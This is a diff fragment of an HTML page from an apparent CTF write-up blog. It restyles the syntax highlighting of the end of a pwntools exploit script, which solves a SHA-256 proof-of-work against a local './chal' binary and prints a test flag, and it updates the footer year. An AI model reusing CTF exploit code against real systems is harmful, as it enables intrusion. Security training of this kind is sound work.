+nonce</span><span class="o"> =</span><span class="p"> shell.recv(</span><span class="mi">32</span><span class="p">)
 
-def sha256(nonce):
-    hash = bytes.fromhex(nonce.decode())
-    for i in range(0x1300000):
-        hash = hashlib.sha256(hash).digest()
-    return hash
+</span><span class="o">def</span><span class="na"> sha256</span><span class="p">(</span><span class="ra">nonce</span><span class="p">):
+    hash</span><span class="o"> =</span><span class="na"> bytes</span><span class="p">.fromhex(nonce.decode())
+    </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">0x1300000</span><span class="p">):
+        hash </span><span class="o">= </span><span class="p">hashlib.sha256(hash).digest()
+    </span><span class="o">return</span><span class="p"> hash
 
-answer = sha256(nonce).hex().upper()
-shell.sendline(b"A" + answer.encode())
+answer</span><span class="o"> = </span><span class="p">sha256(nonce).hex().upper()
+shell.sendline(</span><span class="no">b</span><span class="s">"A"</span><span class="o"> +</span><span class="p"> answer.encode())
 
-flag = shell.recvline_contains(b"hackdef")
-log.info(f"Flag: {flag.decode()}")</span>
+flag</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag:</span><span class="p"> {flag.decode()}</span><span class="s">"</span><span class="p">)</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ python3 exploit.py
-[+] Starting local process './chal': pid 30127
-[*] Flag: hackdef{mylpwn_f4k3_fl4g_4_t35t1ng}
-[*] Stopped process './chal' (pid 30127)</span>
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 30127
+[</span><span class="az">*</span><span class="p">] Flag: hackdef{mylpwn_f4k3_fl4g_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Stopped process './chal' (pid 30127)</span>
 </code></pre></div></div><br>
 
 </section>
@@ -2211,7 +2210,7 @@ log.info(f"Flag: {flag.decode()}")</span>
 </article>
   </div>
   <footer class="footer">
-    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+    <span class="footer__copyright">&copy; 2026 - xchg2pwn</span>
   </footer><br><br>
 
 <script type="text/javascript" src="/js/jquery.min.js"></script>
